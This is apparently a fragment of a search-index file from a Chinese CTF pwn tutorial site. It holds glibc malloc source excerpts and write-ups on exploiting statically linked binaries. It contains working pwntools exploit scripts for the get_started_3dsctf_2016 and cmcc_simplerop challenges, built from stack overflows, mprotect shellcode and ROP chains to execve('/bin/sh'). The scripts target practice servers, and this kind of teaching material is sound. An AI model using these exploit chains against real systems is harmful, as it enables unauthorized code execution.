Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) & ~MALLOC_ALIGN_MASK; set_head(old_top, old_size | PREV_INUSE); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ set_head(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_head(chunk_at_offset(old_top, old_size + 2 * SIZE_SZ), (2 * SIZE_SZ) | PREV_INUSE); /* If possible, release the rest. */ if (old_size >= MINSIZE) { _int_free(av, old_top, 1); } } } } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8fd9\u91cc\u7a0b\u5e8f\u5c06\u65e7\u7684 top chunk \u8fdb\u884c\u4e86\u91ca\u653e\uff0c\u90a3\u4e48\u5176\u4f1a\u6839\u636e\u5927\u5c0f\u8fdb\u5165\u4e0d\u540c\u7684 bin \u6216 tcache \u4e2d\u3002","title":"\u8c03\u6574"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_20","text":"if ((unsigned long)av->system_mem > (unsigned long)(av->max_system_mem)) av->max_system_mem = av->system_mem; check_malloc_state(av);","title":"\u66f4\u65b0\u6700\u5927\u5185\u5b58"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_21","text":"","title":"\u5206\u914d\u5185\u5b58\u5757"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_22","text":"/* finally, do the allocation */ p = av->top; size = chunksize(p);","title":"\u83b7\u53d6\u5927\u5c0f"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#top","text":"/* check that one of the above allocation paths succeeded */ if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(p, nb); av->top = remainder; set_head(p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, p, nb); return chunk2mem(p); }","title":"\u5207\u5206 TOP"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_23","text":"/* catch all failure paths */ __set_errno(ENOMEM); return 0;","title":"\u6355\u6349\u6240\u6709\u9519\u8bef"},{"location":"linker/statically_linked/","text":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002 \u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016 \u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u7f16\u8bd1\u60c5\u51b5 \u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped \u6f0f\u6d1e\u51fd\u6570 main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002 \u601d\u8def \u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) exp \u4ec5\u6808\u6ea2\u51fa from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) p.interactive() \u6808\u6ea2\u51fa+mprotect \u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive() \u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300 32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002 \u5b9e\u9a8c\u4e09\uff1acmcc_simplerop \u8003\u70b9\uff1a\u9759\u6001\u94fe\u63a5\u3001\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u6808\u6ea2\u51fa \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u7a0b\u5e8f\uff0cNX \u4fdd\u62a4 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u6f0f\u6d1e\u51fd\u6570 main \u4e2d\u6ea2\u51fa\uff0c\u6ea2\u51fa\u957f\u5ea6\u633a\u5927\u7684\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [esp+1Ch] [ebp-14h] puts(\"ROP is easy is'nt it ?\"); printf(\"Your input :\"); fflush(stdout); return read(0, &v4, 0x64); } \u601d\u8def \u4e4b\u524d\u9047\u5230 get_started_3dsctf_2016 \u7684\u65f6\u5019\u60c5\u51b5\u4e0e\u8fd9\u6761\u9898\u76ee\u770b\u4e0a\u53bb\u7c7b\u4f3c\uff0c\u7528\u7684\u662f mprotect \u7ed9\u5185\u5b58\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u7136\u540e\u5199\u5165 shellcode \u3002\u5b9e\u9645\u64cd\u4f5c\u4e00\u4e0b\u8fd9\u6761\u9898\u76ee\uff0cbss \u3001 got.plt \u4e24\u4e2a\u6bb5\u4fee\u6539\u4e0d\u6210\u529f\uff0c\u6700\u540e\u770b\u5927\u4f6c wp \u77e5\u9053\u7528 \u7cfb\u7edf\u8c03\u7528\u53f7 \u3002\u4e4b\u524d\u4e5f\u505a\u8fc7\u4e00\u6761\u9898\u76ee\u4e5f\u662f\u7528\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u53ef\u4ee5\u5957\u7528\u90a3\u4e2a\u601d\u8def\u3002 \u4ec0\u4e48\u662f\u7cfb\u7edf\u8c03\u7528\uff1f \u7ef4\u57fa\u767e\u79d1 \u7cfb\u7edf\u8c03\u7528\u53f7\u6709\u54ea\u4e9b\uff1f Linux\u7cfb\u7edf\u8c03\u7528 int 80h int 0x80 \u5c31\u662f\u6211\u4eec\u6700\u540e\u6267\u884c\u8fd9\u6761\u547d\u4ee4\uff1a int80(11,\"/bin/sh\",null,null) \u3002\u7cfb\u7edf\u8c03\u7528\u53c2\u6570\u662f\u8bfb\u53d6\u5bc4\u5b58\u5668\u4e2d\u7684\uff08\u5bf9\u8fd9\u4e0d\u662f32\u4f4d\u7cfb\u7edf\u7684\u6808\u4f20\u53c2\uff09\u3002 \u56db\u4e2a\u53c2\u6570\u5bf9\u5e94\u5bc4\u5b58\u5668\u662f\uff1aeax\u3001ebx\u3001ecx\u3001edx payload = p32(pop_eax) + p32(0xb) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) payload += p32(int_80) \u7a0b\u5e8f\u4e2d\u6ca1\u6709\u627e\u5230 /bin/sh\\x00 \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u6784\u5efa\u8c03\u7528 read \u51fd\u6570\u5199\u5165\u5b57\u7b26\u4e32 payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8) exp #encoding:utf-8 from pwn import * context.log_level = 'debug' p = remote('node3.buuoj.cn',29604) #p = process(\"./simplerop\") int_80 = 0x80493e1 pop_eax = 0x80bae06 read_addr = 0x0806CD50 binsh_addr = 0x080EB584 pop_edx_ecx_ebx = 0x0806e850 payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8) payload += p32(pop_eax) + p32(0xb) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) payload += p32(int_80) #gdb.attach(p) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive()","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#_1","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#get_started_3dsctf_2016","text":"\u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002","title":"\u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016"},{"location":"linker/statically_linked/#_2","text":"","title":"\u5206\u6790"},{"location":"linker/statically_linked/#_3","text":"32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"linker/statically_linked/#_4","text":"\u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped","title":"\u7f16\u8bd1\u60c5\u51b5"},{"location":"linker/statically_linked/#_5","text":"main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"linker/statically_linked/#_6","text":"\u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200)","title":"\u601d\u8def"},{"location":"linker/statically_linked/#exp","text":"","title":"exp"},{"location":"linker/statically_linked/#_7","text":"from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) 